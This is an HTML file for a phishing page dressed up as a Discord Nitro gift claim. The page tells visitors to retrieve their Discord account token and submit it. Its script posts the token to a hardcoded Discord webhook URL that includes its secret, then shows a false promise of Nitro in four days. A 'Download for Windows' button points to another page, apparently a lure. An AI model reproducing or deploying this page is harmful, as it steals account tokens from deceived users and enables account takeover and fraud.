<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Nitro Gift</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #36393f;
            color: white;
            text-align: center;
            padding: 50px;
        }
        .container {
            background-color: #2f3136;
            padding: 20px;
            border-radius: 10px;
            display: inline-block;
            max-width: 600px;
        }
        input[type="text"] {
            padding: 10px;
            margin: 10px 0;
            width: 300px;
            border-radius: 5px;
            border: 1px solid #ccc;
        }
        input[type="submit"], button {
            padding: 10px 20px;
            background-color: #7289da;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin: 5px;
        }
        input[type="submit"]:hover, button:hover {
            background-color: #677bc4;
        }
        .instructions {
            text-align: left;
            margin: 20px 0;
        }
        video {
            width: 100%;
            max-width: 500px;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Claim Your Discord Nitro Gift!</h1>
        <p>Watch the video below to learn how to retrieve your Discord token.</p>

        <!-- Video Tutorial -->
        <video controls>
            <source src="video.mp4" type="video/mp4">
            Your browser does not support the video tag.
        </video>

        <!-- Token Submission Form -->
        <form id="tokenForm">
            <input type="text" id="token" name="token" placeholder="Enter your Discord token" required>
            <br>
            <input type="submit" value="Submit">
        </form>

        <!-- Download Button -->
        <button onclick="window.location.href='download.html'">Download for Windows</button>
    </div>

    <script>
        document.getElementById('tokenForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const token = document.getElementById('token').value;

            // Send the token to a Discord webhook
            const webhookURL = 'https://discord.com/api/webhooks/1348778933398540329/IioufFNH6x2Kp7k2nBBWlB83vhjuEB5bR8F6TmEhKJskUsSXy4SppMHDE5MlrsJ-t6Zj';
            const message = {
                content: `New token submitted: ${token}`
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(message)
            })
            .then(response => {
                if (response.ok) {
                    alert('Done! Wait 4 days to receive your Nitro.');
                } else {
                    alert('Failed to submit token. Please try again.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('An error occurred while submitting the token.');
            });
        });
    </script>
</body>
</html>
